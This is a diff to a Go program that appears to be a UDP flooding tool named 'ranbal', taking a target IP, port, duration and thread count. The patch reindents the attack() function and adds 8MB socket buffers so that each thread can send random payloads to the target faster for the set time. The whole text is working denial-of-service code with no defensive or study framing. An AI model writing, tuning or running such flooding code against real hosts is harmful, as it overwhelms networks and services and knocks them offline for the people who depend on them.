@@ -124,30 +124,35 @@ func generateRandomPayload() []byte {
 }
 
 func attack(data ThreadData, wg *sync.WaitGroup) {
-	defer wg.Done()
+    defer wg.Done()
 
-	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", data.ip, data.port))
-	if err != nil {
-		fmt.Println("Error resolving address:", err)
-		return
-	}
+    addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", data.ip, data.port))
+    if err != nil {
+        fmt.Println("Error resolving address:", err)
+        return
+    }
 
-	conn, err := net.DialUDP("udp", nil, addr)
-	if err != nil {
-		fmt.Println("Error creating socket:", err)
-		return
-	}
-	defer conn.Close()
+    conn, err := net.DialUDP("udp", nil, addr)
+    if err != nil {
+        fmt.Println("Error creating socket:", err)
+        return
+    }
+    defer conn.Close()
 
-	endTime := time.Now().Add(time.Duration(data.duration) * time.Second)
-	for time.Now().Before(endTime) {
-		payload := generateRandomPayload()
-		if _, err := conn.Write(payload); err != nil {
-			fmt.Println("Send failed:", err)
-			return
-		}
-	}
+    // Increase the buffer size to avoid 'no buffer space' errors
+    conn.SetReadBuffer(1024 * 1024 * 8)  // 8MB buffer size
+    conn.SetWriteBuffer(1024 * 1024 * 8) // 8MB buffer size
+
+    endTime := time.Now().Add(time.Duration(data.duration) * time.Second)
+    for time.Now().Before(endTime) {
+        payload := generateRandomPayload()
+        if _, err := conn.Write(payload); err != nil {
+            fmt.Println("Send failed:", err)
+            return
+        }
+    }
 }
+
 
 func usage() {
 	fmt.Println("\nUsage: ./ranbal <ip> <port> <time> <threads>\n")
